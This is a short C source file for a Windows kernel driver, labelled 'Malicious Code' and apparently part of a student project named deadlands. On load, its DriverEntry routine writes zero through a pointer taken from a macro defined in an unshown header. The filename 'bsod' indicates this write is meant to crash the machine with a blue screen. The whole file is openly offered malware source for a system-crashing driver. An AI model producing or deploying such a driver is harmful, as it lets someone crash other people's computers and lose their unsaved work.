/*
**
** Malicious Code - Project: deadlands
** Filename	: [ deadlands-bsod.c ]
** Epi-Tek4 : [ Armand Morgan, Hochwelker Florent, Toumi Majdi ]
**
*/

#include <ntddk.h>
#include "deadlands-bsod.h"

/*
** DRIVER FUNCTIONS:
*/
NTSTATUS	DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	DbgPrint("[MSG]: deadlands bsod - driver entry\n");

	pDriverObject->Unload = DriverUnload;
	*((PULONG)EPITECH) = 0;
	return (STATUS_SUCCESS);
}

NTSTATUS	DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("[MSG]: deadlands bsod - driver unload\n");
	return (STATUS_SUCCESS);
}
